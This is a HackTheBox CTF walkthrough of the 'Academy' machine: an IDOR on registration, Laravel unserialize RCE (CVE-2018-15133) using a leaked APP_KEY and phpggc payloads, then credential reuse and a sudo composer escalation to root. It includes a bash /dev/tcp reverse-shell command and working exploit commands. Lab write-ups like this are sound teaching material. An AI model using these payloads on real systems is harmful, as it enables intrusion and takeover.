---
layout: post
title: "Academy - HackTheBox"
color: rgb(46, 10, 130)
permalink: "/academy-hackthebox"
excerpt_separator: <!--more-->
author: ritiksahni
tags: [HackTheBox, PHP, Laravel, Deserialization, GTFOBins, RCE, Composer]
---

<center><img src="/assets/img/posts/academy-htb/academy_header.png"></center><br>

This box is created by [egre55](https://www.hackthebox.eu/home/users/profile/1190) and [mrb3n](https://www.hackthebox.eu/home/users/profile/2984). It takes us through exploiting a simple IDOR in a web application to escalate our privileges and accessing a task list which reveals a virtual host for development & testing purposes. We then exploit an Unserialize RCE in PHP Laravel framework and receive a reverse shell. We then use enumerate in the machine to find credentials, sensitive files and use misconfigured permissions on /usr/bin/composer to escalate to root in the machine.

<!--more-->
# Contents <a name="top">
* [Port Scanning](#portscan)
* [HTTP (Port 80)](#http)
    * [Exploiting IDOR](#idor)
    * [Exploiting Laravel Unserialize RCE (CVE-2018-15133)](#exploiting-rce)
        * [Exploitation with Metasploit](#msf)
        * [Exploitation w/o Metasploit](#exploit-wo-msf)
            * [Understanding the Exploit](#understand-exp)
* [Privilege Escalation to cry0l1t3](#privesc-cry0l1t3)
* [Privilege Escalation to mrb3n](#privesc-mrb3n)
    * [Understanding System Groups](#understanding-groups)
* [Privilege Escalation to root](#privesc-root)
    * [Understanding the Composer Permissions Abuse](#composer)

# Port Scanning <a name="portscan">

```
# Nmap 7.80 scan initiated Mon Nov  9 00:31:59 2020 as: nmap -sV -sC -sT -T4 -p22,80,33060 -oA nmap/initial 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.80%I=7%D=11/9%Time=5FA840AF%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  9 00:32:36 2020 -- 1 IP address (1 host up) scanned in 36.29 seconds
```

We can observe that there are 3 ports open:

**Port 22 - SSH (OpenSSH 8.2p1 Ubuntu)**  
**Port 80 - HTTP (Apache httpd 2.4.41)**  
**Port 33060 - MySQLx**  
 
---

# HTTP (Port 80)

Nmap script (http-title) indicates us of a virtual host `academy.htb`. We can add that to our /etc/hosts file and access it through our browser.

![login](/assets/img/posts/academy-htb/home.png)

It's a simple page with two buttons on the top right corner. One is for accessing login.php and the other is for accessing register.php, we can create an account and login through these functionalities. After logging in, we see this page:

![loggedin](/assets/img/posts/academy-htb/logged-in.png)

This page is similar to what we get in the modules section of HTB Academy (by HackTheBox team) except in this case everything seems static and there's no interesting function here.

Moving back a step back, we can analyze the registration process with proxy tools like Burp Suite, OWASP Zap etc.

![register-page](/assets/img/posts/academy-htb/register-page.png)

We have this /register.php which is a very simple page. It asks for username, password, and password confirmation. We will fill it up and analyze the request through burp suite.

![register-req](/assets/img/posts/academy-htb/register-burp.png)

We have a POST request with all the data we tried to submit but there's an interesting parameter which is `roleid`.

#### Exploiting IDOR <a name="idor">

The POST parameters look like `uid=deep&password=deep&confirm=deep&roleid=0`. We can change the value of roleid from 0 to 1.

This part of the request should now look like this: 

```php
uid=pwn&password=pwnpass&confirm=pwnpass&roleid=0
```

As soon as we forward this request, we will get redirected to /success-page.php which means we have registered successfully!

---

We have created an admin level account but where do we login now? There's usually a different login page for administrator level accounts and we still haven't discovered that. We can use Gobuster or a similar tool for fuzzing directories/files and looking for the admin login page.

I used gobuster and discovered a page /admin.php and turns out that it is the admin login panel we need. It looks the same as /login.php but it can lead us the way we need for the further steps.


After logging in with the credentials we created an admin level account with, we land upon the following page:

![admin-logged](assets/img/posts/academy-htb/admin-loggedin.png)

It is a launch planner and has status of some tasks. In real world environments, internal panels (or sometimes public :wink:) might contain information like to-do lists, reminders, contact lists and they can be helpful in understanding the scenario better. Here in this list there's a task `Fix issue with dev-staging-01.academy.htb` and it has been marked "Pending" unlike other tasks.

We now know about this staging instance, we can access it by adding the virtual host name in our /etc/hosts file and then opening it in our browser.

![laravel-page](assets/img/posts/academy-htb/laravel-errorpage.png)

## Exploiting Laravel Unserialize RCE (CVE-2018-15133) <a name="exploiting-rce">

Laravel framework through version 5.5.40 and 5.6.x through 5.6.29 are prone to remote code execution as a result of an unserialize call on the value of a user-controlled HTTP request header which is "X-XSRF-TOKEN". For exploiting this vulnerability we need an application key which is usually stored as an environment variable in the server machine. The variable name is supposed to be "APP_KEY".

We have access to a staging instance where the Laravel debug mode is on which is the reason we are able to see the environment variables, machine specific details and some errors. A developer would require this pack of information for debugging the application and it is advised not to enable debug mode on public instances, it exposes a lot of sensitive information a lot of times. In this case, we know that we can obtain APP_KEY in an environment variable inside the machine. The staging instance does the work for us and exposes the supposedly private environment variables and we can just copy and use for exploiting and gaining code execution!

> **Staging environment** is where an application/product is tested or kept under approval from clients or product managers. This is the stage before releasing the final release of the product, feature or functionality.

The APP_KEY can be seen under "Environment & Details"

![app_key](assets/img/posts/academy-htb/app_key.png)

The obtained application key is `dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`.

#### Exploitation with Metasploit <a name="msf">

We can use metasploit for getting a reverse shell. The module for exploiting CVE-2018-15133 is `exploit/unix/http/laravel_token_unserialize_exec`. You can find more information about his exploit from [https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/](https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/)

We are required to set up RHOSTS, RPORT, APP_KEY, VHOST to run the exploit successfully.

![msf-options](/assets/img/posts/academy-htb/exploit-options.png)

We this configuration we can run the exploit and get a reverse shell.

![msf-shell](assets/img/posts/academy-htb/msf-shell.png)

#### Exploitation w/o Metasploit <a name="exploit-wo-msf">

We will try exploiting the unserialize RCE without metasploit now. After searching about this CVE I came across a public exploit on github.com which is [https://github.com/kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)


The public exploit here requires the use of phpggc ([https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)). You can clone the repository in your systems to work with it. PHPGGC is a library of unserialization gadgets along with a PHP script to generate unserialized payloads. We can use the gadgets + available PHP script to create a payload which will be used with our exploit for CVE-2018-15133.

**Listing all the available gadget chains for Laravel:**

```
deep@myubuntu:~/tools/phpggc$ ./phpggc -l Laravel

Gadget Chains
-------------

NAME            VERSION        TYPE                   VECTOR        I
Laravel/RCE1    5.4.27         RCE (Function call)    __destruct
Laravel/RCE2    5.5.39         RCE (Function call)    __destruct
Laravel/RCE3    5.5.39         RCE (Function call)    __destruct    *
Laravel/RCE4    5.5.39         RCE (Function call)    __destruct
Laravel/RCE5    5.8.30         RCE (PHP code)         __destruct    *
Laravel/RCE6    5.5.*          RCE (PHP code)         __destruct    *
Laravel/RCE7    ? <= 8.16.1    RCE (Function call)    __destruct    *
```

The listed gadgets can be used to form an unserialized payload. Let's use Laravel/RCE1 to create a payload.

```
deep@myubuntu:~/tools/phpggc$ ./phpggc Laravel/RCE1 system 'cat /etc/passwd' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjE1OiJjYXQgL2V0Yy9wYXNzd2QiO30=
```

This will execute `system("cat /etc/passwd")` PHP function and get us the passwd file of the system. Please note that the flag `-b` is because it gives us a base64 encoded payload. We have a serialized payload and the APP_KEY so now we can use the public exploit to create the final payload which will be used for gaining code execution. 

Clone the repository of the public exploit [https://github.com/kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133) and execute the script with the APP_KEY and unserialized payload as the arguments.

```
deep@myubuntu:~/tools/laravel-poc-CVE-2018-15133$ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjE1OiJjYXQgL2V0Yy9wYXNzd2QiO30=
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request:
X-XSRF-TOKEN: eyJpdiI6IjNlaHVVVnh2blwvbHc4SDFkbVZuYU1BPT0iLCJ2YWx1ZSI6Ik1CZXNVcE5LbTVGNzY3VHlDdHFqRXNDbHRkSmlGVVQ2K1ZEdnBuUjk5SW5JOVJOOFRqNW5lbGgybUI0K0pZWGlSc2Y0ekpHVHF0eGhFdGYwT1FMS2UxbW1qQXFTeVJWcU13OTVhWk5FeXdrZWhkT2xJMnRSSjYyc2FnWDB3aGVaVnp3OXNOajJ0bk5uYkZIXC9IN0syY1B1MUFjVUN2TWhNZ2lrKzB1UzRHa04zVk43dDZSSk9SNFpheTI4akZKdDVDQmtzNEdzSityeWRaQXFxdW9WaDM3WFcyQTFlZ2t4VnFkSGFvWGRNY2pzVkp0YzZROFdFVkNRdDRNR214TnlVIiwibWFjIjoiZWNkYmIyZGM0YzM3NTkyYjRhZDRkNTVhODY3Nzc2YTE5ZjAzYzQxMTk1MGYwM2YzMGRlN2Y5Zjc1NzhkNzMzMyJ9
```

It gives us an HTTP header for POST request. We need to send a POST request over to the vulnerable website and the response body will have the /etc/passwd file of the system as we executed `cat /etc/passwd`. 

You can use cURL to send the POST request with the X-XSRF-TOKEN header given by the exploit script.

```
deep@myubuntu:~/tools/laravel-poc-CVE-2018-15133$ curl -XPOST http://dev-staging-01.academy.htb --silent --header "X-XSRF-TOKEN: eyJpdiI6IjNlaHVVVnh2blwvbHc4SDFkbVZuYU1BPT0iLCJ2YWx1ZSI6Ik1CZXNVcE5LbTVGNzY3VHlDdHFqRXNDbHRkSmlGVVQ2K1ZEdnBuUjk5SW5JOVJOOFRqNW5lbGgybUI0K0pZWGlSc2Y0ekpHVHF0eGhFdGYwT1FMS2UxbW1qQXFTeVJWcU13OTVhWk5FeXdrZWhkT2xJMnRSSjYyc2FnWDB3aGVaVnp3OXNOajJ0bk5uYkZIXC9IN0syY1B1MUFjVUN2TWhNZ2lrKzB1UzRHa04zVk43dDZSSk9SNFpheTI4akZKdDVDQmtzNEdzSityeWRaQXFxdW9WaDM3WFcyQTFlZ2t4VnFkSGFvWGRNY2pzVkp0YzZROFdFVkNRdDRNR214TnlVIiwibWFjIjoiZWNkYmIyZGM0YzM3NTkyYjRhZDRkNTVhODY3Nzc2YTE5ZjAzYzQxMTk1MGYwM2YzMGRlN2Y5Zjc1NzhkNzMzMyJ9" | head -n 40

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
```

We got the file and this proves that we are able to execute system commands over the victim machine! We can get a reverse shell by creating an unserialized payload with reverse shell command instead of `cat /etc/passwd`. 

![shell-www](assets/img/posts/academy-htb/shell-www.png)

I used the command `./phpggc Laravel/RCE1 system "bash -c 'bash -i >& /dev/tcp/10.10.14.6/9000 0>&1'" -b` here to create a reverse shell payload.

Let's understand how this works and then we will proceed with privilege escalation part of this box.

#### Understanding the Exploit <a name="understand-exp">

- PHPGGC simply creates a serialized PHP object with Laravel gadget chain which runs system("COMMAND"); resulting in code execution.

- The public exploits available for CVE-2018-15133 gives us the base64 encoded payload of the JSON data of the encrypted APP_KEY and serialized object payload (given by PHPGGC) with a keyed hash value (HMAC).

Laravel uses AES-256-CBC encrypted values and our exploit generates random bytes, base64 encodes our supplied APP_KEY and serialized payload then use [openssl_encrypt](https://www.php.net/manual/en/function.openssl-encrypt.php) upon the random bytes and the values given in arguments in the following code snippet:

```php
$value = \openssl_encrypt(
    base64_decode($value), $cipher, base64_decode($key), 0, $iv
);
```

The random bytes are now base64 encoded and a keyed hash value is generated using [hash_hmac](https://www.php.net/manual/en/function.hash-hmac.php) PHP function.

In the final step, the random bytes, OpenSSL encrypted value and the HMAC is converted to an array of variables using [compact](https://www.php.net/manual/en/function.compact.php) PHP function then JSON encoded. The JSON encoded value is again encoded using Base64 algorithm.

We are now left with a base64 encoded value which can be used as the header value for "X-XSRF-TOKEN". We can send a POST request with a header "X-XSRF-TOKEN" with our supplied value and it gets deserialized on the box and the code is executed.

---

## Privilege Escalation to cry0l1t3 <a name="privesc-cry0l1t3">

Upon receiving the reverse shell, we are landed in the root directory of the staging web application. We can go to the web root of the stable application (academy.htb) which is located at /var/www/html/academy.htb and Laravel environment variables of this application at the production stage can be viewed easily inside the /var/www/html/academy/.env file.

![env-file](assets/img/posts/academy-htb/env-file.png)

We can see a variable `DB_PASSWORD` which has the value `mySup3rP4s5w0rd!!`. Upon using this password on different users of the box, I got logged in as cry0l1t3 successfully!

![cry0l1t3](assets/img/posts/academy-htb/cryo-shell.png)

Apparently, the default shell for the user cry0l1t3 is /bin/sh but you can switch to /bin/bash easily for a better experience in solving the box.

## Privilege Escalation to mrb3n <a name="privesc-mrb3n">

You might have noticed that in the previous screenshot I've ran the command `id` to enumerate the groups the user cry0l1t3 is present in. We can see that the user is a part of the `adm` group. We have seen a similar scenario in the box [Doctor](https://ritiksahni.me/doctor-hackthebox). Let's recall it again.

#### Understanding System Groups <a name="understanding-groups">

Linux system groups are groups that are specifically for users with capabilities in the system such as monitoring logs and processes, maintaining backups, etc.

In this box, we have found a user “web” which is in the group “adm”. The group “adm” is a system group for users with capabilities to monitor system tasks, they have access to the directory /var/log which stores the log files generated by different utilities and software such as Apache2, MySQL, PostgreSQL, Samba logs, etc.

---

Upon running LinPeas, I saw that it found password of mrb3n from /var/log/audit/audit.log.3

![audit](assets/img/posts/academy-htb/linpeas-mrb3n-pass.png)

Audit logs usually store the previously run commands as hex, we can simply hex decode and retrieve clear text commands. We have obtained the hex and decoding it gives us the password of mrb3n user of the box. The password of mrb3n is `mrb3n_Ac@d3my!`. We

We can now login as mrb3n via su command or SSH.

![b3n-login](assets/img/posts/academy-htb/su-b3n.png)

## Privilege Escalation to root <a name="privesc-root">

Whenever I get a shell of any box I try to run `sudo -l` to check for any misconfigured permissions and enumerating. In this case, I could see that mrb3n had the permission to run `/usr/bin/composer` as root!

![sudo-l](assets/img/posts/academy-htb/b3n-sudo.png)

Generally the binary `composer` should never be allowed root permissions because it can allow an attacker to escalate privileges and get a fully interactive shell as root over the box. We will exploit this misconfiguration and get root!

Composer is a PHP dependancy manager and could be used in projects to conveniently declare the required libraries, composer looks up and installs those libraries for us.

[GTFOBins](https://gtfobins.github.io/gtfobins/composer/#sudo) has a page for composer which can be found here: [https://gtfobins.github.io/gtfobins/composer/#sudo](https://gtfobins.github.io/gtfobins/composer/#sudo)

It tells us the way to escalate our privileges using composer binary.


**Steps for abusing root permission on /usr/bin/composer**:

- In any directory, create a file with the name "composer.json"
- Add the following contents inside composer.json

```json
{"scripts":{"hack_academy":"/bin/bash -i 0<&3 1>&3 2>&3"}}
```

You can use any available text-editor or just "echo" command to create composer.json with the above file contents.

- Run the following command in the shell as mrb3n

```bash
sudo /usr/bin/composer run-script hack_academy
```

We will get a root shell!

![rooted](assets/img/posts/academy-htb/rooted.png)


---

#### Understanding the Composer Permissions Abuse <a name="composer">

We put `{"scripts":{"hack_academy":"/bin/bash -i 0<&3 1>&3 2>&3"}}` inside composer.json because it simply creates a composer script with the name hack_academy with the command /bin/bash to be executed. Composer scripts are used for PHP callbacks or just running command-line executable command like we did just now. After a composer script is made, we ran /usr/bin/composer as sudo with the argument "run-script" as it allows us to specify a composer script we created and finally the name of the script which is "hack_academy" in our case.

---

**I hope you enjoyed this walkthrough and learned about the importance of not exposing sensitive keys, exploiting deserialization RCE in Laravel based application and finally some Linux binary abuse (composer). Feel free to contact me on my socials for feedback, suggestions! [Contact Me](/contact)**

[Back to Top](#top)